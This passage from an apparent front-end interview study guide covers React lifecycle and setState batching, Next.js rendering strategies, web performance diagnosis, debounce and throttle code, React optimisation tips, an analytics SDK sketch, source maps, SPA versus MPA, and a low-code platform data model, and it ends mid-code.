- `componentDidMount()`: This method is called after the component is mounted to the DOM. It's used for DOM manipulation, fetching data from a remote endpoint, and setting up subscriptions (e.g., listeners).

### Updating
The updating phase occurs when a component's state or props change, leading to a re-render of the component. This phase includes several key lifecycle methods:
- `static getDerivedStateFromProps()`: As in the mounting phase, this method is called before the render method and is used to update the state based on changes in props.
- `shouldComponentUpdate()`: This method allows you to decide whether or not React should continue with the rendering process. By returning `true` or `false`, you can optimize component performance.
- `render()`: The render method is called again to re-render the UI based on the new props or state.
- `getSnapshotBeforeUpdate()`: This method is called right before the changes from the virtual DOM are to be reflected in the DOM. It can return a value that will be passed to `componentDidUpdate()`.
- `componentDidUpdate()`: Called after the update has been rendered and reflected in the DOM. It's used for DOM updates, fetching new data, and re-setup of subscriptions if needed.

### Unmounting
The unmounting phase occurs when a component is being removed from the DOM. It includes one main lifecycle method:
- `componentWillUnmount()`: This method is called right before a component is destroyed and removed from the DOM. It's used to perform any necessary cleanup, such as invalidating timers, canceling network requests, or cleaning up any subscriptions made in `componentDidMount()`.


## Understanding React's `setState` Behavior

React's `setState` method is fundamental for managing state changes within components. It's designed to optimize application performance through asynchronous updates and batching. 

### Asynchronous State Updates and Batching

React batches multiple `setState` calls into a single update to minimize re-rendering, enhancing application performance. This batching is automatic, combining several updates into one, leading to fewer re-renders and a smoother user experience.

**Example:** Observe how `setState` behaves within a lifecycle method.

```javascript
componentDidMount() {
  this.setState({ val: this.state.val + 1 }); // Initial state: val = 0
  console.log(this.state.val); // Likely logs 0, not 1 due to batching

  this.setState({ val: this.state.val + 1 });
  console.log(this.state.val); // Still logs 0 for the same reason

  // `setState` within setTimeout runs synchronously
  setTimeout(() => {
    this.setState({ val: this.state.val + 1 });
    console.log(this.state.val); // Now logs 2, updates are applied

    this.setState({ val: this.state.val + 1 });
    console.log(this.state.val); // Logs 3, confirming the synchronous update
  }, 0);
}
```

### Synchronous Updates in Specific Contexts

While `setState` is predominantly asynchronous within React's lifecycle and event handling, there are exceptions where it executes synchronously:

- **JavaScript Timing Functions:** Inside `setTimeout` or `setInterval`, `setState` acts synchronously.
- **Promise Resolutions:** In `.then` or async function callbacks, `setState` is synchronous.
- **Native DOM Events:** Using `setState` in native event handlers results in synchronous updates.
- **AJAX Callbacks:** AJAX callbacks also trigger synchronous `setState` updates.

**Example:** Synchronous update with a native event handler.

```javascript
document.getElementById('myButton').addEventListener('click', () => {
  this.setState({ val: this.state.val + 1 });
  console.log(this.state.val); // Updates and logs the new value instantly
});
```

### Embracing React 18's Automatic Batching

React 18 enhances batching by automatically applying it across all update scenarios, including those previously synchronous. This change simplifies state update patterns and further improves performance.

**Adapting to React 18:**

```javascript
// Before React 18
ReactDOM.render(<App />, document.getElementById('root'));

// With React 18 and onwards
const root = React.createRoot(document.getElementById('root'));
root.render(<App />);
```

### Exceptions to Batching

Some updates are processed immediately, even with React's batching:

- Updates in a `setState` callback are immediate.
- Synchronous updates still occur in certain non-React contexts, like direct DOM event handlers or timing functions.

## `setState` as Microtask or Macrotask?

`setState` can act as either, influenced by its execution context. Within `setTimeout`, it's a macrotask, while in a `Promise.resolve().then()`, it becomes a microtask. This flexibility allows `setState` to adapt its execution for optimal application performance.

**Execution Timing Example:**

```javascript
componentDidMount() {
  setTimeout(() => {
    console.log('--Start--');

    Promise.resolve().then(() => {
      console.log('--Promise then--');
    });

    this.setState({ val: this.state.val + 1 });
    console.log(this.state.val); // Displays the current state value

    console.log('--End--');
  });
}
// Expected output sequence: --Start--, current state value, --End--, --Promise then--
```

## Advantages of Next.js Over React

Next.js is an advanced framework built on top of React. It introduces a set of features aimed at improving the development and performance of web applications. Here's an organized and enhanced overview of its key benefits:

- **Server-Side Rendering (SSR)**
  - SSR greatly enhances the user experience by speeding up the initial page load times. It does so by serving fully-rendered HTML pages from the server, ready for the browser to display. This not only reduces the time users spend waiting for content to become interactive but also significantly boosts SEO. Search engines can crawl and index the content more effectively because it's fully rendered upfront.

- **Static Site Generation (SSG)**
  - SSG allows developers to pre-render pages during the build process. These pages are then served instantly from a Content Delivery Network (CDN), which drastically cuts down on load times and server processing. This method is particularly efficient for sites with content that doesn't change often, making it a stellar choice for blogs, documentation sites, and corporate websites.

- **Incremental Static Regeneration (ISR)**
  - ISR combines the strengths of SSR and SSG to offer a dynamic solution for static content. It allows pages to be regenerated with updated data on a per-request basis without necessitating a complete site rebuild. This innovative approach means that websites can serve static pages for fast load times while still updating content in almost real-time, a game-changer for e-commerce sites, news platforms, and more.

- **File System Routing**
  - By utilizing the filesystem for routing, Next.js makes page creation and route management straightforward. Developers can simply add files to the `pages` directory, and the framework automatically creates routes matching the file structure. This convention-over-configuration approach simplifies navigation and streamlines the development process.

- **API Routes**
  - With built-in support for API routes, Next.js enables developers to handle frontend and backend code within the same project. This facilitates the development of full-stack applications without the need to separate the client and server logic, streamlining project management and deployment.

- **Built-In CSS and Sass Support**
  - Next.js simplifies the styling process by natively supporting CSS and Sass. Developers can import styles directly into components without any extra setup or configuration, making it easier to manage styles and ensuring that styles are only loaded when the component is rendered, thereby improving performance.

- **Optimized Performance and Automatic Code Splitting**
  - Next.js automatically splits code at the page level, ensuring that only the necessary JavaScript is loaded for each page. This results in faster page loads and a smoother browsing experience for users. The framework also includes various optimization features out of the box, such as image optimization, minimizing the effort required to achieve high performance.

- **Community and Ecosystem**
  - Next.js benefits from a large and active community of developers. This vibrant ecosystem provides a wealth of plugins, tools, and integrations, addressing common development challenges and facilitating innovation. The strong community support also means that developers have access to a plethora of resources, tutorials, and forums for learning and troubleshooting.

## Next.js Rendering Strategies: SSR, SSG, and ISR vs. Traditional React Rendering
### Server-Side Rendering (SSR)

**Overview**: SSR dynamically generates HTML for each page request at the server level. This approach allows the server to pre-render React components into HTML, enhancing SEO and ensuring content is immediately available to the user upon request.

**Workflow**:
1. **Request Initiation**: A user or search engine makes a request to the server for a specific page.
2. **React Component Rendering**: The server executes React components associated with the requested route, generating the page's HTML.
3. **HTML Delivery**: This HTML is sent to the client's browser, displaying the content instantly.
4. **Hydration**: The browser subsequently downloads the JavaScript bundle, enabling interactivity through React hydration.

**Implementation**: Utilize the `getServerSideProps` function within Next.js pages to perform server-side operations, such as fetching data, which is then passed as props to the component.

### Static Site Generation (SSG)

**Overview**: SSG pre-renders pages into static HTML files during the build phase. These files are served directly to the browser, significantly reducing load times and server requests.

**Workflow**:
1. **Build-time HTML Generation**: During the build, Next.js pre-renders pages into static HTML using the site's React components.
2. **Static File Serving**: The generated HTML files are stored and served as static resources upon request.
3. **Immediate Content Display**: Browsers display the static content instantly upon loading.
4. **Hydration Process**: Similar to SSR, the static content is then hydrated to become fully interactive.

**Implementation**: Leverage `getStaticProps` for data fetching at build time and `getStaticPaths` for dynamic routing, enabling the generation of static pages with dynamic content.

### Incremental Static Regeneration (ISR)

**Overview**: ISR combines the best of SSR and SSG, allowing for static pages to be updated "on-the-fly" after deployment without needing a full rebuild of the site.

**Workflow**:
1. **Initial Static Generation**: Pages are generated statically at build time.
2. **Regeneration Trigger**: Upon a page request, the server evaluates if the page should be updated based on specified criteria (e.g., time intervals).
3. **Stale Content Delivery with Background Regeneration**: If an update is needed, the server serves the current (stale) version to the user, while a new version is generated in the background for subsequent requests.
4. **Continuous Updates**: This mechanism ensures content remains fresh without sacrificing load times.

**Implementation**: Use `getStaticProps` with the `revalidate` property to set the conditions under which a page should be regenerated.

### Traditional React Project Rendering

**Characteristics**: Traditional React apps primarily rely on Client-Side Rendering (CSR), where a static HTML file is sent to the browser, and React renders the UI dynamically in the browser.

**Comparative Analysis**:
- **Performance & SEO**: Next.js strategies like SSR, SSG, and ISR enhance initial page load speed and improve SEO by serving pre-rendered content. Conversely, CSR may result in slower initial loads and SEO challenges.
- **Development Experience**: Next.js offers a comprehensive framework with built-in features for optimization, which can introduce a learning curve compared to the straightforwardness of traditional React but ultimately provides a richer set of tools for developers.
- **Flexibility & Optimization**: With Next.js, developers can choose the most suitable rendering strategy for each part of their application, offering unparalleled flexibility and optimization opportunities. Traditional React's reliance on CSR may be simpler but lacks the built-in mechanisms for optimizing performance and SEO in diverse scenarios.

## Next.js Lifecycle Events and Phases
### Server-side Lifecycle (During SSR or SSG)

The server-side lifecycle begins when a page request is made. Next.js processes this request in distinct stages to serve the requested content efficiently.

**Data Fetching**

Data fetching methods enable you to pull data into your application during different stages of the rendering process. These methods cater to various rendering strategies:

- **`getStaticProps`**: Utilized during the build time for static generation. It fetches data and passes it as props to your page at build time, making it ideal for pages that can pre-render with static data.
- **`getServerSideProps`**: Executed on every request in server-side rendering contexts. This function allows for data fetching on a per-request basis, ensuring that the rendered page always includes the most up-to-date data.
- **`getInitialProps`**: Although still supported, this method is less recommended. It can fetch data for both SSR and CSR but lacks the efficiency and specificity of `getStaticProps` and `getServerSideProps`. It can be used in pages and the `_app.js` component.

**Rendering**

Next.js then proceeds to render the page:

- After executing the appropriate data fetching methods, Next.js server renders the React components into HTML, combining them with the fetched data.

**Result**

- The server responds to the client's request by sending the rendered HTML along with any fetched JSON data (for `getStaticProps` or `getServerSideProps`), ensuring an optimized initial load.

### Client-side Lifecycle

Upon receiving the HTML, the browser re-hydrates the static content into a dynamic React application, enabling interactive features.

**Mounting**

The mounting phase establishes the foundation of the application's client-side lifecycle:

- **`constructor`**: Initializes the component state and binds event handlers.
- **`static getDerivedStateFromProps`**: Updates the state based on changes to props over time.
- **`render`**: Responsible for UI rendering.
- **`componentDidMount`**: Marks the component as fully interactive. It's the ideal place for operations that should only occur in a client-side context, such as API calls exclusive to the client.

**Updating**

The updating phase manages changes to props or state:

- **`static getDerivedStateFromProps`**: Prepares for state changes derived from new props.
- **`shouldComponentUpdate`**: Determines if the component should re-render in response to state or props changes.
- **`render`**: Re-renders the UI based on state or props changes.
- **`getSnapshotBeforeUpdate`**: Captures the DOM state before updates (e.g., for scroll position).
- **`componentDidUpdate`**: Invoked after re-rendering, suitable for DOM updates based on the latest changes.

**Unmounting**

- **`componentWillUnmount`**: Cleans up any resources allocated during the component's lifecycle, such as timers or network requests, to prevent memory leaks.

### Navigation

Next.js enhances client-side navigation through:

- Prefetching resources for linked pages, making subsequent page loads almost instantaneous.
- Utilizing Next.js's `<Link />` or the `router.push()` for optimized client-side routing, akin to a single-page application but with the added benefits of Next.js's performance optimizations.

### Build Time

The build phase is critical for optimizing your application:

- **`getStaticProps`** and **`getStaticPaths`** are crucial for static generation, allowing Next.js to pre-render pages with dynamic routes at build time, ensuring faster load times and SEO benefits.
# 7. Performance.md

## How to diagnose performance issues in a slow HTML5 page?
Start by asking the interviewer whether the issue is related to slow operations or slow loading times to narrow down the problem scope and demonstrate proactive communication skills. Then, check for any errors; if there are errors, start investigating from there. If there are no errors, use Chrome's Performance tools for further investigation.

### Front-end Performance Metrics
- **First Paint (FP):** The time it takes for the browser to render the first pixel to the screen.
- **First Contentful Paint (FCP):** The time it takes for the browser to render the first DOM content.
- **First Meaningful Paint (FMP):** Deprecated. This metric was used to measure the time it takes for the browser to render meaningful content for the first time. It has been replaced by LCP.
- **DOMContentLoaded (DCL):** The time it takes for the DOM to be fully loaded and parsed.
- **Largest Contentful Paint (LCP):** The time it takes for the largest content element in the viewport to become visible.
- **Load:** The time it takes for the entire page and all its resources to fully load.

These metrics are arranged in chronological order: FP < FCP < FMP < DCL < LCP < Load.

### Chrome DevTools
- **Performance:** Records page performance data, including CPU, memory, network, rendering, and more. Enabling screenshots captures web page snapshots, and timing indicators can show the metrics mentioned above.
- **Network:** Analyzes network requests, including the resources requested, timeline, size, and more. It also shows an overview of performance metrics when enabled.

### Lighthouse
A popular third-party performance evaluation tool that works on both mobile and desktop. It provides an overall score, including the above metrics, and offers optimization suggestions such as using next-gen image formats (e.g., WebP, AVIF), compressing and correctly sizing images, which can save loading time.

**Example:**
```
npm install -g lighthouse
lighthouse https://www.baidu.com --view --preset=desktop
```

### Web Page Loading Slowly?
- Improve server hardware configurations, use CDN.
- Implement route lazy loading and asynchronously load large components to reduce the main package size.
- Optimize HTTP caching strategies.

### Slow Rendering?
- Optimize backend services (e.g., slow AJAX data fetching).
- Further analyze and optimize the logic within front-end components.
- Implement server-side rendering (SSR).

### Continuous Follow-up
Performance optimization is a gradual process, unlike bug fixes which can often be resolved quickly. Continuously monitor performance, identify bottlenecks, and implement optimizations progressively. Utilize third-party analytics services such as Alibaba Cloud ARMS, Baidu Analytics, or Google Analytics for ongoing performance tracking.

### Summary
Analyze performance metrics to identify the root causes of slowness, address issues specifically, and continuously improve and optimize for better performance.

## What is debouncing and what is throttling, what are the differences, and name use cases of each

### Debouncing

Debouncing in web development is a strategy used to limit the frequency of execution of a potentially expensive operation that could be triggered repeatedly, such as during window resizing or scrolling. A debounced function will only execute after a specified amount of time has elapsed since the last time it was invoked. For example, if a debounced function is associated with a scrolling event, it will only execute after the user has stopped scrolling for a defined period.

**Throttling**

Throttling is a technique similar to debouncing, but instead of delaying the execution of a function, it ensures the function is executed at regular intervals. For instance, a function triggered by a scroll event, when throttled to execute every 100 milliseconds, will run at most 10 times per second, regardless of the frequency of the scroll event.

**Differences between Debouncing and Throttling**

1. **Timing Control**: Debouncing delays the execution of a function until a specified time has passed since its last invocation. Throttling, however, limits the function's execution to regular, specified intervals.

2. **Use Cases**: Debouncing is useful in scenarios where the function's frequent execution is unnecessary and delays are acceptable, such as in auto-saving or search bar suggestions. Throttling is employed when consistent execution rate is desired, like in handling scroll events or resizing.

3. **Behavior**: In debouncing, the function executes only after the triggering event has ceased for a defined duration. In throttling, the function executes at consistent intervals regardless of the frequency of event triggers.

**Use Cases**

1. **Debouncing**: This is commonly used in search bars, where you want to wait for the user to finish typing before firing an API request, rather than sending requests for every keystroke.

2. **Throttling**: An example is the implementation of infinite scrolling on a website, where you aim to load more content at certain intervals of scrolling, rather than at every small scroll movement.

Both debouncing and throttling are integral for enhancing performance and user experience in web applications. Libraries like **Lodash** offer robust implementations of these techniques.

### Implement debouncing in typescript
```js
function debounce(func, waitFor) {
    let timeout;

    return function(...args) {
        clearTimeout(timeout);
        timeout = setTimeout(() => {
            func.apply(this, args);
        }, waitFor);
    };
}

// Example Usage:
const debouncedLog = debounce((message) => console.log(message), 500);

// Usage
debouncedLog("Hello");
debouncedLog("Hello again, quickly"); // This call will cancel the previous one and only this message will be logged after 500ms
```

### Implement a throttling function in JavaScript
```js
function throttle(func, limit) {
    let inThrottle;
    return function() {
        const args = arguments;
        const context = this;
        if (!inThrottle) {
            func.apply(context, args);
            inThrottle = true;
            setTimeout(() => inThrottle = false, limit);
        }
    };
}

// Example usage:
window.addEventListener('resize', throttle(function() {
    console.log('Resize event triggered');
}, 2000));
```

## HTML5 First-Screen Optimization Techniques

### 1. Route Lazy Loading
- **Applicability**: Suitable for Single Page Applications (SPA) but not for Multi-Page Applications (MPA).
- **Concepts**: 
  - **SPA** refers to a web application or site that interacts with the user by dynamically rewriting the current page rather than loading entire new pages from the server. This results in a more fluid user experience similar to a desktop application.
  - **MPA** is a traditional web application approach that reloads the entire page and requests the HTML from the server on each page change.
- **Implementation in React**: Achieved by splitting the route and ensuring priority loading of the homepage. This can be done using React's `React.lazy` and `Suspense` for dynamic imports and lazy loading of components.

### 2. Server-Side Rendering (SSR) - Exemplified by Next.js
- **Explanation**: Traditional SPA renders the page in a complex process, downloading HTML and JavaScript first, then fetching other resources. SSR simplifies this process by serving a fully rendered HTML page directly from the server, improving performance.
- **Benefits**: Ideal for pure HTML5 pages as it offers ultimate performance optimization, albeit at a higher cost.
- **Historical Context**: SSR is not a new technology. It has been used since the HTML1.0 era in technologies like PHP, ASP, and JSP. With the evolution of technology and the separation of front-end and back-end development, it has gained recent attention for enhancing user experience. Nuxt.js (for Vue) and Next.js (for React) are current examples.

### 3. App Prefetch
- **Usage**: When an HTML5 page is displayed within an app WebView, such as opening a page on Facebook.
- **Method**: The app preloads the first screen content of an article when the user visits the list page. Upon entering the HTML5 page, content is retrieved directly from the app using JSBridge, allowing instant display of the first screen.

### 4. Pagination
- **Application**: Specifically for list pages.
- **Strategy**: Only the first page's content is displayed by default. More content is loaded as the user scrolls up, which can be optimized further with throttling to manage load performance.

### 5. Image Lazy Loading
- **Focus**: Primarily for detail pages.
- **Approach**: Text content is displayed by default, followed by images through lazy loading.
- **Note**: Ensure image dimensions are set in advance to reserve space, minimizing layout shifts and reflows.

### 6. Hybrid Approach
- **Method**: HTML, JavaScript, and CSS files are pre-downloaded to the app. Pages are loaded using the `file://` protocol within the app's WebView, which is significantly faster as it accesses local files.
- **Content Fetching**: Content is then fetched via AJAX and displayed, potentially in combination with app prefetching for enhanced performance.

## In practical work, how have you optimized React?

### Modify CSS to simulate v-show
Using inline CSS to conditionally display components can be optimized to avoid conditional rendering blocks and improve readability:

```ts
{/* Instead of conditionally rendering the component twice */}
{!flag && <MyComponent style={{display: 'none'}}/>}
{flag && <MyComponent />}

// Use a single line with conditional styling
<MyComponent style={{display: flag ? 'block' : 'none'}} />
```

### Use keys in loops
Using a unique `key` prop in a list helps React identify which items have changed, added, or removed, which can improve the performance of list updates:

```ts
const todoItems = todos.map(todo => 
    // Avoid using the index as a key if the list can change
    <li key={todo.id}>
        {todo.text}
    </li>
)
```

### Use Fragment to reduce DOM depth
React Fragments allow you to group a list of children without adding extra nodes to the DOM, which can lead to a more performant and cleaner DOM structure:

```ts
return <>
    <div>1</div>
    <div>2</div>
</>
```

### Do not define functions in JSX
Defining functions directly in JSX can lead to performance issues as the function will be recreated on every render. Instead, define your function outside the JSX return statement:

```ts
// Avoid defining functions directly in the JSX
<button onClick={() => {...}}>Click Me</button>

// Prefer defining your function outside and referencing it in JSX
function MyComponent() {
    const handleClick = () => {...}
    return <button onClick={handleClick}>Click Me</button>
}
```

### Bind `this` in the constructor
For class components, it's important to bind `this` in the constructor to ensure that `this` refers to the component instance in your event handlers:

```ts
class MyComponent extends React.Component {
    constructor(props) {
        super(props)
        // Bind this in the constructor
        this.handleClick = this.handleClick.bind(this)
    }
    handleClick() { /* Now `this` refers to the component instance */ }
    
    // Arrow functions automatically bind `this` to the class instance
    handleClick2 = () => { /* Arrow function, no need to bind this */ }
    
    render() {
        return <button onClick={this.handleClick}>Click Me</button>
    }
}
```

### Use shouldComponentUpdate or React.PureComponent
#### `shouldComponentUpdate`

The `shouldComponentUpdate` method is available in class components and allows you to prevent unnecessary re-renders by manually determining whether a component should update in response to changes in props or state. It receives the next props and state as arguments and returns a boolean value indicating whether React should continue with the rendering process.

Implementing `shouldComponentUpdate` can significantly improve performance, particularly in cases where you know that the UI does not need to update in response to certain changes.

```ts
class MyComponent extends React.Component {
  shouldComponentUpdate(nextProps, nextState) {
    // Only re-render if the next id is different from the current one
    return nextProps.id !== this.props.id;
  }
  
  render() {
    return <div>{this.props.id}</div>;
  }
}
```

In the example above, the component will only re-render if the `id` prop changes. This manual comparison can be very efficient but requires careful implementation to avoid missed updates or stale renders.

#### `React.PureComponent`

`React.PureComponent` is a base class for class components that automatically implements `shouldComponentUpdate` with a shallow prop and state comparison. When your component extends `React.PureComponent`, React will shallowly compare the old props and state with the new ones and re-render the component only if there was a change.

This is particularly useful for components that have simple props and state structures where a shallow comparison is sufficient to detect changes.

```ts
class MyComponent extends React.PureComponent {
  render() {
    return <div>{this.props.id}</div>;
  }
}
```

While `React.PureComponent` reduces the need to manually implement `shouldComponentUpdate`, it's important to remember that it performs a shallow comparison. This means it might not work as expected if your props or state include complex data structures like nested objects or arrays that might change internally without changing their identity.

#### `React.memo`

For functional components, which cannot extend `React.PureComponent` or implement `shouldComponentUpdate`, React provides the `React.memo` higher-order component. Similar to `React.PureComponent`, `React.memo` wraps a functional component and adds a memoization feature, performing a shallow comparison of the component's props. If the props are the same as the previous render, React will skip rendering the component and reuse the last rendered result.

```ts
const MyComponent = React.memo(function MyComponent(props) {
  return <div>{props.id}</div>;
});
```

`React.memo` is a powerful tool for optimizing functional components, especially when they are expected to render often with the same props. For more complex comparison logic, `React.memo` accepts a second argument, a custom comparison function, giving you control over the comparison logic similar to `shouldComponentUpdate`.

```ts
const MyComponent = React.memo(function MyComponent(props) {
  // Component body
}, (prevProps, nextProps) => {
  // Return true if passing nextProps to render would return
  // the same result as passing prevProps, false otherwise
  return prevProps.id === nextProps.id;
});
```
# 8. Project Design.md

## Designing a Front-End Analytics SDK

A Front-End Analytics Software Development Kit (SDK) is essential for collecting, analyzing, and reporting user behavior data on websites. This includes data such as page views (PV), click events, custom events (e.g., subscriptions to a VIP service, cancellations of a VIP service), performance metrics, and error logging. Large companies often develop their own analytics solutions, while small to medium-sized enterprises might opt for third-party services like Google Analytics.

The SDK serves as a bridge between the client-side environment and the analytics server, enabling a cyclical process: The SDK collects data from the user's interactions with the website, sends this data to the analytics server, and then the server processes and analyzes the data to generate reports. These insights can then be used to optimize the website, creating a feedback loop that enhances user experience.

### Key Metrics to Track

1. **Page Views (PV):** Measure the number of times a page is loaded or reloaded in a browser.
2. **Custom Events:** Track specific user actions such as becoming a VIP member or cancelling a VIP membership.
3. **Performance Metrics:** Monitor the performance of the website, including loading times and interaction delays.
4. **Error Logging:** Capture JavaScript errors and promise rejections to identify issues affecting user experience.

### SDK Design Overview

```javascript
class AnalyticsSDK {
  constructor(productId) {
    this.productId = productId;
    this.initPerformanceTracking();
    this.initErrorTracking();
  }

  // Use private methods for internal functionality in TypeScript
  send(url, params = {}) {
    params.productId = this.productId;
    const queryString = Object.entries(params)
      .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
      .join('&');
    const fullUrl = `${url}?${queryString}`;
    // Use a beacon or an image to send data to overcome CORS issues, no need for response handling, and better compatibility
    navigator.sendBeacon ? navigator.sendBeacon(fullUrl) : this.fallbackSend(fullUrl);
  }

  initPerformanceTracking() {
    window.addEventListener('load', () => {
      const performanceData = performance.timing.toJSON ? performance.timing.toJSON() : performance.timing;
      this.send('https://analytics.example.com/performance', { data: JSON.stringify(performanceData) });
    });
  }

  initErrorTracking() {
    window.addEventListener('error', (event) => {
      this.sendError(event.message, event.filename, event.lineno, event.colno);
    });
    window.addEventListener('unhandledrejection', (event) => {
      this.sendError('Unhandled Promise Rejection', event.reason);
    });
  }

  sendError(message, source = '', lineno = 0, colno = 0) {
    this.send('https://analytics.example.com/error', { message, source, lineno, colno });
  }

  trackPageView() {
    // Implement logic to avoid duplicate tracking on single-page applications
    this.send('https://analytics.example.com/pv', { url: window.location.href });
  }

  trackEvent(eventName, value) {
    this.send('https://analytics.example.com/event', { eventName, value });
  }

  fallbackSend(url) {
    // Fallback for older browsers without navigator.sendBeacon support
    const img = new Image();
    img.src = url;
  }
}

// Usage example
document.addEventListener('DOMContentLoaded', () => {
  const analytics = new AnalyticsSDK('your-product-id');
  analytics.trackPageView();
});
```

This code example outlines the basic structure and functionality of an analytics SDK. It demonstrates how to send data to an analytics server using either the Beacon API or an image tag as a fallback, how to track performance metrics, handle errors, and record custom events. Remember, this is a starting point, and the implementation can be extended with more features like batched sending for performance optimization, more sophisticated error handling, or integration with popular frameworks.

**Conclusion**

When designing a front-end analytics SDK, the key considerations should include the types of data you wish to collect, how to efficiently and securely transmit this data to the server, and ensuring that your tracking does not adversely affect the user experience. Tailor your SDK to be flexible, extensible, and easy to integrate into existing projects.

## Understanding and Configuring Source Maps

Source maps are files that provide a way of mapping code within a compressed or minified file back to its original source. This is particularly useful in JavaScript where the production code is often obfuscated and minified to reduce load times and improve performance. When an error occurs in such scripts, the source map allows developers to see the original code instead of the minified or obfuscated version, thus making debugging much easier.

**Benefits of Source Maps**

- **Debugging**: Converts obfuscated or minified code references back into the original source code, enabling easier debugging.
- **Error Tracking**: Allows you to trace errors and logs in the production environment back to the exact place in the source code where they were generated.

**How to Locate a Source Map**

Source maps can typically be identified and accessed in one of two ways:

1. By the source mapping URL comment at the end of a JavaScript file, which looks like this: `//# sourceMappingURL=jquery.min.map`.
2. By a `.map` file located in the same directory as the JavaScript file, e.g., `jquery.min.map`.

### Configuring Source Maps with Webpack

Webpack offers various options for generating source maps, controlled through the `devtool` configuration property. Here are the common settings:

- **`source-map`**: Generates a separate `.map` file and appends a sourceMappingURL comment to the end of the JavaScript file.
- **`eval-source-map`**: Each module is executed with `eval()` and a SourceMap is added as a DataUrl to the eval.
- **`inline-source-map`**: Adds a DataUrl containing the sourcemap to the JavaScript file.
- **`cheap-source-map`**: Generates a source map that includes line numbers only, not column mappings.
- **`eval-cheap-source-map`**: Similar to `cheap-source-map`, but uses `eval()` and does not produce a separate `.map` file.

**Code Example for Webpack Configuration**

```javascript
// File: build/webpack.prod.js
module.exports = {
  devtool: 'source-map'
};
```

Running `npm run build` will generate the source map file in the distribution folder. The generated `.map` file will be referenced at the bottom of the JavaScript file:

```javascript
//# sourceMappingURL=bundle.xxx.js.map
```

### Best Practices for Source Map Usage

- **Development Environment**: Use configurations like `eval`, `eval-source-map`, or `eval-cheap-source-map` for faster build and rebuild speed. Alternatively, source maps may be omitted entirely if not needed for initial development testing.
- **Production Environment**: Use `source-map` to enable detailed debugging capabilities without exposing the source code directly within the JavaScript files.
- **Open Source Projects**: Source maps should be available to aid other developers in debugging and understanding the codebase.
- **Proprietary Projects**: Avoid distributing source maps in production to protect the source code. External visibility of source maps can lead to reverse engineering and potential code leakage.

## When to Use SPA and When to Use MPA?

### SPA: Single Page Application
Single Page Applications (SPAs) are web applications that load a single HTML page and dynamically update that page as the user interacts with the app. SPAs use JavaScript to load content and typically involve frameworks like React, Vue.js, or Angular. These frameworks can be configured as SPAs or MPAs, but are often used to create efficient SPAs due to their component-based architectures.

**Use Cases for SPA:**
- **Complex Web Applications:** SPAs are ideal for situations where the user experience benefits from a seamless interaction without the page reloads typical of traditional web applications. Examples include advanced project management tools, interactive social media platforms, and rich user dashboards.
- **High Interaction Applications:** Applications that require real-time user interactions without interruption, such as live data updates, instant messaging platforms, and collaborative tools.
- **Internal Business Applications:** Large scale enterprise dashboards, such as CRM systems or cloud service consoles, where constant page reloading can hinder productivity.

**Advantages:**
- **Speed and User Experience:** After the initial load, SPAs do not require page reloads, which can significantly enhance the user experience by providing faster transitions and a smooth, app-like feel.
- **Reduced Server Load:** Since most resources are loaded once at the start, SPAs can reduce server load during the session.

**Considerations:**
- **Initial Load Time:** SPAs typically require more time to load initially as they fetch all the necessary JavaScript at once.
- **SEO Challenges:** Search engines traditionally have difficulties indexing content that is dynamically loaded by JavaScript. This can be mitigated by implementing Server Side Rendering (SSR) or using tools like prerendering.

### MPA: Multi Page Application
Multi Page Applications (MPAs) work in a traditional way where each change or submission leads to a new page being sent to the client by the server. This approach is straightforward and aligns with the original working of the web.

**Use Cases for MPA:**
- **Simple Websites:** If the site is mostly static and informational, such as a corporate website, an MPA may be more appropriate.
- **E-commerce Sites:** Online stores often benefit from an MPA setup, where each product page can be indexed separately by search engines.
- **Content-driven Projects:** News sites, blogs, and marketing websites where SEO is crucial can benefit from the straightforward link structure and easier indexability of MPAs.

**Advantages:**
- **SEO:** MPAs have a clear advantage in search engine optimization since each page is indexed separately with its own URL.
- **Simplicity:** Development can be more straightforward, as the server handles most of the content rendering.

**Considerations:**
- **User Experience:** Navigating between pages can result in a slower, less seamless user experience, particularly if the server response time is slow.
- **Higher Server Load:** Each page request loads resources from the server, which can increase load and affect performance during high traffic periods.

### Choosing Between SPA and MPA
The decision to use an SPA or MPA should not solely be based on technological capabilities but should consider the specific business needs and user experience requirements. Evaluate the complexity of the application, the need for speed and seamless interactions against the importance of SEO, and simplicity in development and maintenance.

## Design a Data Model and Core Features for an HTML5 Low-Code Development Platform

Creating an effective data model for a low-code development platform involves constructing a robust structure that supports extensive customization, real-time collaboration, and project management. This section outlines the primary components and functionalities that should be considered in the design process.

- **User Interface Design Tools:** Tools should allow users to visually create and adjust UI components. Features might include drag-and-drop interfaces, property inspectors, and responsive design options.
- **Project Management:** Capabilities should include creating new projects, saving ongoing work, publishing finished or interim stages, and managing project versions.
- **Collaboration Features:** The platform should support simultaneous editing by multiple users, conflict resolution strategies, and live updates to facilitate team-based project development.
- **Extensibility:** The system should allow for the integration of third-party or custom-built plugins and components to enhance functionality.

### Data Model Considerations

To achieve efficient and scalable management of project data and user activities, consider the following:

- **Data Syncing:** Use technologies such as WebSockets for real-time communication and long polling for less frequent updates to ensure that all users see the most current project state without significant delay.
- **Component Selection:** Maintain a detailed registry of each user-selected component, identified by unique IDs. This registry should track changes to component properties over time, aiding in undo/redo features and historical edits.
- **Layer Management:** Implement a system to manage the z-index and stacking of UI components through an organized list or array. This arrangement helps in manipulating layer properties like order, visibility, and nesting.

### Efficient Component Management

Organizing components and their properties efficiently ensures smoother operation and better performance:

- **Style Management:** Centralize styling information within a `style` object for each component to facilitate the application of themes and visual updates.
- **Layer Representation:** Utilize array indices for managing layer depth to simplify rendering logic and enable quick adjustments to the visual hierarchy.

### Example Implementation in React

Below is an example of a React context provider setup for managing project state in a low-code development environment:

```jsx
import React, { useContext, useState } from 'react';

const ProjectContext = React.createContext();

const ProjectProvider = ({ children }) => {
    const [project, setProject] = useState({
        title: "My New Project",
        settings: {
            language: 'EN',
            theme: 'light',
        },
        layout: {
            backgroundColor: '#f0f0f0',
            fontSize: '14px',
        },
        components: [
            {
                id: 'header',
                name: 'Main Header',
                type: 'text',
                style: {
                    color: '#333',
                    fontSize: '32px',
                },
                attributes: {
                    content: 'Welcome to Your Project',
                },
                children: [],
            },
            {
                id: 'image1',
                name: 'Feature Image',
                type: 'image',
                style: {
                    width: '100%',
                    height: 'auto',
                },
                attributes: {
                    src: 'url/to/your/image.jpg',
                    alt: 'Descriptive Image Alt Text',
                },
            }
        ],
        selectedComponentId: null,
    });

    const handleComponentSelect = (componentId) => {
        setProject(prevProject => ({ ...prevProject, selectedComponentId: componentId }));
    };

    return (
